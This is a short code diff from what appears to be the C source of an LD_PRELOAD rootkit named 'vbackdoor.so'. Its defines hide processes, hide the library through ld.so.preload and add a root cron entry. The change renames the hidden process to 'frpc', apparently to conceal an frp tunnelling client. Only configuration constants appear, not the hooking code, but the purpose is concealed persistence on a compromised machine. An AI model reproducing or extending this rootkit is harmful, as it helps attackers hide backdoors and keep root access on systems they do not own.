@@ -14,8 +14,8 @@
 #include <limits.h>
 #include <errno.h>
 
-#define MAGIC_STRING "evil" // hide process one
-#define MAGIC_DEAMON "evil_deamon" // hide process two
+#define MAGIC_STRING "frpc" // hide process one
+#define MAGIC_DEAMON "frpc" // hide process two
 #define CONFIG_FILE "ld.so.preload" // hide self
 #define LIB_FILE "vbackdoor.so" // hide self
 #define CRONTAB_CODE1 "* * * * * root ping 8.8.8.8 \n" //add cron /etc/cron.d/root
